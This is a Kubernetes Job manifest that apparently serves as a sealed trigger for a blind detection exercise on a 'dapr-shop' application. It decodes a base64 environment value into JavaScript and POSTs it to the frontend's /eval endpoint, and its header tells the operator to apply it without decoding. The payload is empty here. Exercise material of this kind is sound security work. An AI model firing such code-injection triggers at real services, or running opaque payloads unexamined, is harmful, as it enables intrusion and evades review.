# SEALED in-fabric trigger for the dapr-shop blind exercise — apply, DO NOT DECODE.
# Posts an opaque payload to the frontend; everything it does rides Dapr's own building-block
# APIs. You're graded on what your detection surfaces, not on reading this base64.
apiVersion: batch/v1
kind: Job
metadata: {name: dapr-shop-trigger, namespace: shop}
spec:
  backoffLimit: 0
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: trigger
        image: curlimages/curl:latest
        env:
        - {name: SEALED_DO_NOT_DECODE, value: ""}
        command: ["sh","-c"]
        args: ["printf '%s' \"$SEALED_DO_NOT_DECODE\" | base64 -d > /tmp/a.js; curl -s -m 10 -X POST http://frontend.shop.svc.cluster.local/eval --data-binary @/tmp/a.js; echo done"]
